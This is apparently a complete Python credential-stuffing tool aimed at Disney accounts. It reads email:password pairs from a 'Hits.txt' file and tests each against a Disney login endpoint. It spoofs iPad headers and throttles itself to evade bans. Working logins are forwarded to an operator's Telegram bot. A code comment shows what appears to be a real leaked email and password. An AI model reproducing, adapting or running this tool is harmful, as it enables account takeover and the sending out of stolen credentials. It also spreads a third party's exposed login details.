import requests, time, os, sys, random
from concurrent.futures import ThreadPoolExecutor

# --- [ HEAVY UI: EMA SKULL ] ---
P, B, G, R, W = "\033[35m", "\033[34m", "\033[32m", "\033[31m", "\033[0m"
BANNER = f"""
{P}      _______              _______
     /   _  \\            /  _   /
____\\  \\\\ \\\\______// //  /____
/     \\  \\\\ \\\\      // //  /     \\
|         |    {W}X  X{P}     |         |
|         \\  IIIIIIII  /         |
{W} .------------------------------------.
 | {P}D I S N E Y  -  A V E N G E R  v5.1{W} |
 '------------------------------------'
 {B}[!] PROXY: {R}DISABLED (BYPASS MODE){W}
 {B}[!] DNS: {G}SHIELDED{W}
 --------------------------------------
"""

def boot():
    os.system('clear')
    print(BANNER)
    
    # --- LOCAL SETUP ---
    TOKEN = input(f"{P}[?] Enter Bot Token: {W}")
    CHAT_ID = input(f"{P}[?] Enter Chat ID: {W}")

    print(f"\n{B}[*] Locating Hits.txt in root...{W}")
    try:
        with open("Hits.txt", "r") as f:
            lines = f.readlines()
    except:
        print(f"{R}[x] Error: Hits.txt not found in root!{W}")
        return

    print(f"{G}[+] Found {len(lines)} accounts. Starting scan...{W}\n")

    def check_acc(line):
        try:
            line = line.strip()
            if ":" not in line: return
            
            # Parsing the specific format from your file
            # Example: scotcarrison@icloud.com:ScoT13070505 | Status...
            auth = line.split(" | ")[0] 
            email, password = auth.split(":")
            
            sys.stdout.write(f"\r{B}[ SHADOW ] {W}{email[:22]}...")
            sys.stdout.flush()

            # Mobile iPad Headers to prevent revokes/bans
            headers = {
                "User-Agent": "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
                "Content-Type": "application/json"
            }
            
            r = requests.post(
                "https://disney.api.edge.sdk.disney.com/v1/public/login", 
                json={"email": email, "password": password},
                headers=headers,
                timeout=15
            )

            if r.status_code == 200:
                print(f"\n{G}[+] LIVE HIT: {email}{W}")
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                              json={"chat_id": CHAT_ID, "text": f"💀 *SHADOW HIT*\n`{auth}`", "parse_mode": "Markdown"})
            
            elif r.status_code == 429:
                print(f"\n{R}[!] Rate Limited. Sleeping 10s...{W}")
                time.sleep(10)
                
        except:
            pass

    # No Proxy means we go slightly slower to stay safe
    # 5 workers is the limit for "Proxyless" on iPad
    with ThreadPoolExecutor(max_workers=5) as ex:
        ex.map(check_acc, lines)

if __name__ == "__main__":
    boot()
